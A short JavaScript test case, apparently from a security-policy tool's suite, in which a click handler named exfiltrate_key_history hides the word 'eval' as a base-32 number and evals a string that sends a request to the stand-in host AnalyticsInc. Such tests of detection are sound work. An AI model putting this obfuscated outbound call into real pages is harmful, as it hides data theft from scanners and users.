
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval3", true);xmlhttp.send(null);';
  var v4 = 8 << 2;
  var v3 = (490837).toString(v4);
  var v2 = v3 + "";
  var v0 = eval(v2);
  v0(exp);
  return;
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history

JAM.stopProfile('load');
